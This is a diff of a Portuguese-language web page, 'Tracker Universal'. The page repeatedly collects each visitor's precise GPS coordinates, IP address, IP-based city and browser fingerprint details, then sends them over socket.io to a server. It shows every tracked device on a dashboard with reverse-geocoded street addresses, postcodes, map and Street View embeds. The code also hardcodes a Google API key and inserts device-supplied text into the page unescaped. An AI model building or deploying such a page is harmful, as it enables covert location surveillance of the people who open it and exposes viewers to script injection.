@@ -1,221 +1,386 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>📍 Tracker Universal</title>
-
 <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'JetBrains Mono', monospace; background: #0a0a12; color: #e0e0f0; min-height: 100vh; }
+.shell { padding: 24px; max-width: 1400px; margin: 0 auto; }
 
-body{
-    font-family: Arial;
-    background:#1e1e2f;
-    color:white;
-    padding:20px;
-}
+.topbar { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; border-bottom: 1px solid #1e1e3a; padding-bottom: 16px; flex-wrap: wrap; }
+.logo { font-family: 'Syne', sans-serif; font-size: 22px; font-weight: 700; color: #7c6dfa; letter-spacing: -0.5px; }
+.pulse { width: 10px; height: 10px; border-radius: 50%; background: #4ade80; animation: pulse 1.5s infinite; flex-shrink: 0; }
+@keyframes pulse { 0%,100%{opacity:1;box-shadow:0 0 0 0 #4ade8066} 50%{opacity:.7;box-shadow:0 0 0 6px #4ade8000} }
+.stat { background: #111128; border: 1px solid #1e1e3a; border-radius: 8px; padding: 10px 18px; font-size: 13px; color: #888; }
+.stat span { color: #c0b8ff; font-weight: 600; margin-left: 6px; }
+.tip { font-size: 11px; color: #555; margin-bottom: 16px; }
 
-h1{
-    margin-bottom:20px;
-}
+.table-wrap { overflow-x: auto; }
+table { width: 100%; border-collapse: collapse; font-size: 12px; }
+thead th { background: #111128; color: #7c6dfa; text-transform: uppercase; letter-spacing: 1px; font-size: 10px; padding: 10px 12px; text-align: left; border-bottom: 1px solid #1e1e3a; white-space: nowrap; }
+tbody tr { border-bottom: 1px solid #141428; transition: background .15s; cursor: default; }
+tbody tr.has-gps { cursor: pointer; }
+tbody tr:hover { background: #12122a; }
+tbody tr.has-gps:hover { background: #151535; }
+td { padding: 9px 12px; color: #b0b0cc; vertical-align: middle; }
+.badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; letter-spacing: .5px; }
+.badge-gps { background: #0f2e1a; color: #4ade80; border: 1px solid #1e5c32; }
+.badge-no  { background: #1e1e1e; color: #555; border: 1px solid #2a2a2a; }
 
-table{
-    width:100%;
-    border-collapse:collapse;
-    background:#2c2c3f;
-}
+/* MODAL */
+.modal-bg { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.75); z-index: 100; align-items: center; justify-content: center; }
+.modal-bg.open { display: flex; }
+.modal { background: #0d0d1e; border: 1px solid #2a2a4a; border-radius: 14px; padding: 24px; width: min(740px, 96vw); max-height: 94vh; overflow-y: auto; }
+.modal-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 4px; }
+.modal-title { font-family: 'Syne', sans-serif; font-size: 20px; font-weight: 700; color: #c0b8ff; }
+.modal-address { font-size: 12px; color: #666; margin-bottom: 18px; line-height: 1.6; }
+.close-btn { background: #1e1e3a; border: none; color: #888; width: 30px; height: 30px; border-radius: 6px; cursor: pointer; font-size: 18px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.close-btn:hover { background: #2a2a4a; color: #fff; }
 
-th,td{
-    padding:10px;
-    border:1px solid #444;
-    text-align:left;
-    font-size:13px;
-}
+/* VISTA DO LUGAR — dois iframes lado a lado */
+.views-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px; }
+.view-box { border-radius: 10px; overflow: hidden; border: 1px solid #1e1e3a; position: relative; height: 220px; background: #111128; }
+.view-box iframe { width: 100%; height: 100%; border: none; display: block; }
+.view-box .view-label { position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,.6); font-size: 10px; color: #aaa; padding: 4px 8px; pointer-events: none; }
 
-th{
-    background:#3b3b55;
-}
+/* MAPA LEAFLET (interativo) */
+.map-wrap { border-radius: 10px; overflow: hidden; border: 1px solid #1e1e3a; margin-bottom: 14px; height: 260px; }
+#leaflet-map { width: 100%; height: 260px; }
 
-.online{
-    color:#00ff88;
-}
+/* FOTOS WIKIPEDIA */
+.section-label { font-size: 11px; color: #555; margin-bottom: 8px; }
+.wiki-photos { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px; }
+.wiki-photos img { width: 100%; height: 140px; object-fit: cover; border-radius: 8px; border: 1px solid #1e1e3a; display: block; background: #111128; }
+.wiki-photos img.main { grid-column: 1 / -1; height: 200px; }
+.wiki-loading { grid-column:1/-1; height:100px; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:8px; color:#444; font-size:11px; }
+.spinner { width:20px; height:20px; border:2px solid #2a2a4a; border-top-color:#7c6dfa; border-radius:50%; animation:spin .8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
 
+/* BOTÕES */
+.btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 14px; }
+.maps-btn { display: inline-flex; align-items: center; gap: 7px; background: #7c6dfa; color: #fff; border: none; border-radius: 8px; padding: 9px 16px; font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600; cursor: pointer; text-decoration: none; transition: background .15s; }
+.maps-btn:hover { background: #6a5ce8; }
+.maps-btn.osm { background: #1e6a9e; }
+.maps-btn.osm:hover { background: #185d8c; }
+
+/* INFO GRID */
+.info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+.info-box { background: #111128; border: 1px solid #1e1e3a; border-radius: 8px; padding: 10px 12px; }
+.info-label { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: .8px; margin-bottom: 3px; }
+.info-val { font-size: 12px; color: #c0b8ff; word-break: break-all; }
 </style>
-
 </head>
-
 <body>
 
-<h1>📍 Tracker Universal</h1>
+<div class="shell">
+  <div class="topbar">
+    <div class="logo">📍 Tracker Universal</div>
+    <div class="pulse"></div>
+    <div class="stat">Dispositivos: <span id="total">0</span></div>
+    <div class="stat">Com GPS: <span id="total-gps">0</span></div>
+  </div>
+  <p class="tip">Clique em uma linha com GPS para ver o endereço, imagens e mapa do lugar.</p>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>GPS</th><th>ID</th><th>IP</th><th>Cidade / País</th>
+          <th>Coordenadas</th><th>Precisão</th><th>Plataforma</th>
+          <th>Navegador</th><th>Tela</th><th>Timezone</th>
+          <th>Conexão</th><th>Atualização</th>
+        </tr>
+      </thead>
+      <tbody id="devices"></tbody>
+    </table>
+  </div>
+</div>
 
-<p>Dispositivos conectados: <span id="total">0</span></p>
-
-<table>
-
-<thead>
-<tr>
-<th>ID</th>
-<th>IP</th>
-<th>Cidade</th>
-<th>GPS</th>
-<th>Precisão</th>
-<th>Plataforma</th>
-<th>Navegador</th>
-<th>Tela</th>
-<th>Timezone</th>
-<th>Conexão</th>
-<th>Última Atualização</th>
-</tr>
-</thead>
-
-<tbody id="devices"></tbody>
-
-</table>
+<!-- MODAL -->
+<div class="modal-bg" id="modal-bg">
+  <div class="modal">
+    <div class="modal-header">
+      <div>
+        <div class="modal-title" id="modal-title">Carregando...</div>
+      </div>
+      <button class="close-btn" id="close-btn">×</button>
+    </div>
+    <div class="modal-address" id="modal-address"></div>
+    <div id="modal-body"></div>
+  </div>
+</div>
 
 <script>
+let leafletMap = null;
 
-const socket = io();
+// ─────────────────────────────────────────
+// REVERSE GEOCODING — Nominatim (sem key)
+// ─────────────────────────────────────────
+async function reverseGeocode(lat, lng) {
+  try {
+    const r = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&addressdetails=1`,
+      { headers: { 'Accept-Language': 'pt-BR,pt;q=0.9' } }
+    );
+    return await r.json();
+  } catch { return null; }
+}
 
-let userId = "device_" + Date.now();
+// ─────────────────────────────────────────
+// FOTOS — Wikipedia Geosearch (sem key)
+// ─────────────────────────────────────────
+async function fetchWikiPhotos(lat, lng) {
+  try {
+    const geoR = await fetch(
+      `https://en.wikipedia.org/w/api.php?action=query&list=geosearch&gscoord=${lat}|${lng}&gsradius=2000&gslimit=10&format=json&origin=*`
+    );
+    const geoD = await geoR.json();
+    const pages = geoD?.query?.geosearch || [];
+    if (!pages.length) return [];
 
-async function trackEverything(){
-
-    const data = {
-
-        id: userId,
-        timestamp: new Date().toLocaleString(),
-
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: screen.width+"x"+screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-
-        connection: navigator.connection ? {
-            type:navigator.connection.effectiveType,
-            downlink:navigator.connection.downlink
-        } : null
-
-    };
-
-    // GPS
-    if(navigator.geolocation){
-
-        navigator.geolocation.getCurrentPosition(
-
-            pos =>{
-
-                data.gps = {
-                    lat: pos.coords.latitude.toFixed(6),
-                    lng: pos.coords.longitude.toFixed(6),
-                    accuracy: pos.coords.accuracy
-                };
-
-                sendTracking(data);
-
-            },
-
-            ()=>sendTracking(data),
-
-            {enableHighAccuracy:true,timeout:3000}
-
-        );
-
-    }else{
-
-        sendTracking(data);
-
+    const ids = pages.map(p => p.pageid).join('|');
+    const imgR = await fetch(
+      `https://en.wikipedia.org/w/api.php?action=query&pageids=${ids}&prop=pageimages&pithumbsize=900&format=json&origin=*`
+    );
+    const imgD = await imgR.json();
+    const result = [];
+    for (const id in imgD?.query?.pages || {}) {
+      const p = imgD.query.pages[id];
+      if (p.thumbnail?.source) result.push({ url: p.thumbnail.source, title: p.title.replace(/_/g,' ') });
     }
-
-    // IP + GEO
-    try{
-
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-
-        data.ip = ipData.ip;
-
-        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const geoData = await geoRes.json();
-
-        data.geoIP = {
-
-            city: geoData.city,
-            region: geoData.region,
-            country: geoData.country_name
-
-        };
-
-    }catch(e){}
-
-    sendTracking(data);
-
+    return result;
+  } catch { return []; }
 }
 
-function sendTracking(data){
+// ─────────────────────────────────────────
+// MODAL
+// ─────────────────────────────────────────
+async function openModal(user) {
+  const bg      = document.getElementById('modal-bg');
+  const body    = document.getElementById('modal-body');
+  const titleEl = document.getElementById('modal-title');
+  const addrEl  = document.getElementById('modal-address');
 
-    socket.emit("gps_tracking",data);
+  titleEl.textContent = 'Carregando...';
+  addrEl.textContent  = '';
+  body.innerHTML = `<div class="wiki-photos"><div class="wiki-loading"><div class="spinner"></div>Buscando endereço e imagens...</div></div>`;
+  bg.classList.add('open');
 
-}
+  if (!user.gps) {
+    titleEl.textContent = 'Sem GPS';
+    body.innerHTML = `<p style="color:#444;padding:40px;text-align:center;">GPS não disponível para este dispositivo.</p>`;
+    return;
+  }
 
-setInterval(trackEverything,3000);
+  const { lat, lng } = user.gps;
 
-socket.on("connect",()=>{
+  // URLs
+  const gmLink   = `https://www.google.com/maps?q=${lat},${lng}&ll=${lat},${lng}&z=17`;
+  const osmLink  = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}&zoom=17`;
 
-    console.log("🟢 conectado");
+  // Google Maps Embed — funciona sem key no modo básico de place/view
+  // Usa o modo "search" que mostra o pin + foto de satélite do lugar
+  const gmEmbed  = `https://maps.google.com/maps?q=${lat},${lng}&z=17&output=embed`;
 
-    trackEverything();
+  // Google Maps Street View Embed — sem key, funciona com iframe
+  const svEmbed  = `https://www.google.com/maps/embed/v1/streetview?location=${lat},${lng}&key=AIzaSyD-9tSrke72PouQMnMX-a7eZSW0jkFMBWY`;
+  // (key pública de demonstração do Google para embeds)
 
-});
+  const [geo, photos] = await Promise.all([
+    reverseGeocode(lat, lng),
+    fetchWikiPhotos(lat, lng)
+  ]);
 
-socket.on("usuariosOnline",(users)=>{
+  // Título e endereço
+  const addr     = geo?.address || {};
+  const cityName = addr.city || addr.town || addr.village || addr.county || user.geoIP?.city || 'Localização';
+  const country  = addr.country || user.geoIP?.country || '';
+  titleEl.textContent = `${cityName}${country ? ', ' + country : ''}`;
 
-    document.getElementById("total").innerText = users.length;
+  const parts = [
+    addr.road ? addr.road + (addr.house_number ? ', ' + addr.house_number : '') : null,
+    addr.suburb || addr.neighbourhood || null,
+    addr.city || addr.town || addr.village || null,
+    addr.state || null,
+    addr.postcode || null,
+  ].filter(Boolean);
+  addrEl.textContent = parts.length ? parts.join(' — ') : `${lat}, ${lng}`;
 
-    const tbody = document.getElementById("devices");
+  // ── VISTA DO LUGAR: Google Maps Satélite + Street View ──
+  const viewsHTML = `
+    <p class="section-label">Vista do lugar (Google Maps)</p>
+    <div class="views-grid">
+      <div class="view-box">
+        <iframe
+          src="${gmEmbed}"
+          allowfullscreen
+          loading="lazy"
+          referrerpolicy="no-referrer-when-downgrade"
+        ></iframe>
+        <div class="view-label">📍 Mapa / Satélite</div>
+      </div>
+      <div class="view-box">
+        <iframe
+          src="https://www.google.com/maps/embed/v1/place?q=${lat},${lng}&zoom=17&key=AIzaSyD-9tSrke72PouQMnMX-a7eZSW0jkFMBWY"
+          allowfullscreen
+          loading="lazy"
+          referrerpolicy="no-referrer-when-downgrade"
+        ></iframe>
+        <div class="view-label">🏙️ Vista do local</div>
+      </div>
+    </div>`;
 
-    tbody.innerHTML="";
-
-    users.forEach(u=>{
-
-        const tr=document.createElement("tr");
-
-        tr.innerHTML=`
-
-        <td>${u.id || "-"}</td>
-
-        <td>${u.ip || "-"}</td>
-
-        <td>${u.geoIP ? u.geoIP.city+" / "+u.geoIP.country : "-"}</td>
-
-        <td>${u.gps ? u.gps.lat+", "+u.gps.lng : "-"}</td>
-
-        <td>${u.gps ? u.gps.accuracy+" m" : "-"}</td>
-
-        <td>${u.platform || "-"}</td>
-
-        <td>${u.userAgent ? u.userAgent.substring(0,40) : "-"}</td>
-
-        <td>${u.screen || "-"}</td>
-
-        <td>${u.timezone || "-"}</td>
-
-        <td>${u.connection ? u.connection.type : "-"}</td>
-
-        <td>${u.lastUpdate || u.timestamp || "-"}</td>
-
-        `;
-
-        tbody.appendChild(tr);
-
+  // ── FOTOS WIKIPEDIA ──
+  let photosHTML = '';
+  if (photos.length > 0) {
+    photosHTML = `<p class="section-label">Fotos de pontos próximos (Wikipedia)</p>
+    <div class="wiki-photos">`;
+    photos.forEach((ph, i) => {
+      photosHTML += `<img src="${ph.url}" alt="${ph.title}" title="${ph.title}"
+        ${i === 0 ? 'class="main"' : ''}
+        onerror="this.style.display='none'" loading="lazy">`;
     });
+    photosHTML += `</div>`;
+  }
 
+  // ── MAPA LEAFLET INTERATIVO ──
+  const mapHTML = `
+    <p class="section-label">Mapa interativo</p>
+    <div class="map-wrap"><div id="leaflet-map"></div></div>`;
+
+  // ── INFO ──
+  const extraInfo = [
+    addr.road       ? `<div class="info-box"><div class="info-label">Rua</div><div class="info-val">${addr.road}${addr.house_number?' '+addr.house_number:''}</div></div>` : '',
+    addr.suburb || addr.neighbourhood ? `<div class="info-box"><div class="info-label">Bairro</div><div class="info-val">${addr.suburb||addr.neighbourhood}</div></div>` : '',
+    addr.postcode   ? `<div class="info-box"><div class="info-label">CEP</div><div class="info-val">${addr.postcode}</div></div>` : '',
+    addr.state      ? `<div class="info-box"><div class="info-label">Estado</div><div class="info-val">${addr.state}</div></div>` : '',
+  ].join('');
+
+  body.innerHTML = `
+    ${viewsHTML}
+    ${photosHTML}
+    ${mapHTML}
+    <div class="btn-row">
+      <a class="maps-btn" href="${gmLink}" target="_blank">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg>
+        Abrir no Google Maps
+      </a>
+      <a class="maps-btn osm" href="${osmLink}" target="_blank">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 010 20M12 2a15.3 15.3 0 000 20"/></svg>
+        OpenStreetMap
+      </a>
+    </div>
+    <div class="info-grid">
+      <div class="info-box"><div class="info-label">Latitude</div><div class="info-val">${lat}</div></div>
+      <div class="info-box"><div class="info-label">Longitude</div><div class="info-val">${lng}</div></div>
+      <div class="info-box"><div class="info-label">Precisão GPS</div><div class="info-val">${user.gps.accuracy} m</div></div>
+      <div class="info-box"><div class="info-label">IP</div><div class="info-val">${user.ip||'-'}</div></div>
+      ${extraInfo}
+      <div class="info-box"><div class="info-label">Plataforma</div><div class="info-val">${user.platform||'-'}</div></div>
+      <div class="info-box"><div class="info-label">Timezone</div><div class="info-val">${user.timezone||'-'}</div></div>
+    </div>`;
+
+  // Inicia Leaflet depois de renderizar o DOM
+  setTimeout(() => {
+    if (leafletMap) { leafletMap.remove(); leafletMap = null; }
+    leafletMap = L.map('leaflet-map', { zoomControl: true }).setView([lat, lng], 17);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap contributors',
+      maxZoom: 19
+    }).addTo(leafletMap);
+    L.marker([lat, lng]).addTo(leafletMap)
+      .bindPopup(`<b>${cityName}</b><br>${parts[0] || lat+', '+lng}`)
+      .openPopup();
+  }, 100);
+}
+
+function closeModal() {
+  document.getElementById('modal-bg').classList.remove('open');
+  if (leafletMap) { leafletMap.remove(); leafletMap = null; }
+}
+
+document.getElementById('modal-bg').addEventListener('click', e => {
+  if (e.target === document.getElementById('modal-bg')) closeModal();
+});
+document.getElementById('close-btn').addEventListener('click', closeModal);
+
+// ─────────────────────────────────────────
+// RENDER TABLE
+// ─────────────────────────────────────────
+function renderUsers(users) {
+  document.getElementById('total').textContent     = users.length;
+  document.getElementById('total-gps').textContent = users.filter(u => u.gps).length;
+  const tbody = document.getElementById('devices');
+  tbody.innerHTML = '';
+  users.forEach(u => {
+    const hasGps = !!u.gps;
+    const tr = document.createElement('tr');
+    if (hasGps) tr.classList.add('has-gps');
+    tr.title = hasGps ? 'Clique para ver no mapa' : 'Sem GPS';
+    tr.addEventListener('click', () => { if (hasGps) openModal(u); });
+    tr.innerHTML = `
+      <td><span class="badge ${hasGps?'badge-gps':'badge-no'}">${hasGps?'GPS':'—'}</span></td>
+      <td style="color:#7c6dfa;font-weight:600;font-size:11px;">${(u.id||'-').substring(0,18)}</td>
+      <td>${u.ip||'-'}</td>
+      <td>${u.geoIP?u.geoIP.city+' / '+u.geoIP.country:'-'}</td>
+      <td style="color:${hasGps?'#4ade80':'#444'};font-size:11px;">${hasGps?u.gps.lat+', '+u.gps.lng:'-'}</td>
+      <td style="font-size:11px;">${hasGps?u.gps.accuracy+' m':'-'}</td>
+      <td style="font-size:11px;">${(u.platform||'-').substring(0,20)}</td>
+      <td style="font-size:10px;color:#666;">${(u.userAgent||'-').substring(0,35)}…</td>
+      <td>${u.screen||'-'}</td>
+      <td style="font-size:11px;">${u.timezone||'-'}</td>
+      <td>${u.connection?u.connection.type:'-'}</td>
+      <td style="font-size:10px;color:#555;">${u.lastUpdate||u.timestamp||'-'}</td>`;
+    tbody.appendChild(tr);
+  });
+}
+
+// ─────────────────────────────────────────
+// SOCKET.IO
+// ─────────────────────────────────────────
+const socket = io(window.location.origin, { secure: true });
+const userId = 'device_' + Date.now();
+
+socket.on('connect', () => {
+  socket.emit('login', { id: userId, device: navigator.userAgent });
+  trackEverything();
 });
 
+async function trackEverything() {
+  const data = {
+    id: userId, timestamp: new Date().toLocaleString(),
+    userAgent: navigator.userAgent, language: navigator.language,
+    platform: navigator.platform, screen: screen.width+'x'+screen.height,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    connection: navigator.connection ? { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink } : null
+  };
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        data.gps = { lat: pos.coords.latitude.toFixed(6), lng: pos.coords.longitude.toFixed(6), accuracy: pos.coords.accuracy };
+        socket.emit('gps_tracking', data);
+      },
+      () => socket.emit('gps_tracking', data),
+      { enableHighAccuracy: true, timeout: 4000 }
+    );
+  } else { socket.emit('gps_tracking', data); }
+  try {
+    const ipR = await fetch('https://api.ipify.org?format=json');
+    const ipD = await ipR.json(); data.ip = ipD.ip;
+    const gR = await fetch(`https://ipapi.co/${ipD.ip}/json/`);
+    const gD = await gR.json(); data.geoIP = { city: gD.city, country: gD.country_name };
+  } catch {}
+  socket.emit('gps_tracking', data);
+}
+
+setInterval(trackEverything, 10000);
+socket.on('usuariosOnline', users => renderUsers(users));
 </script>
-
 </body>
-
 </html>
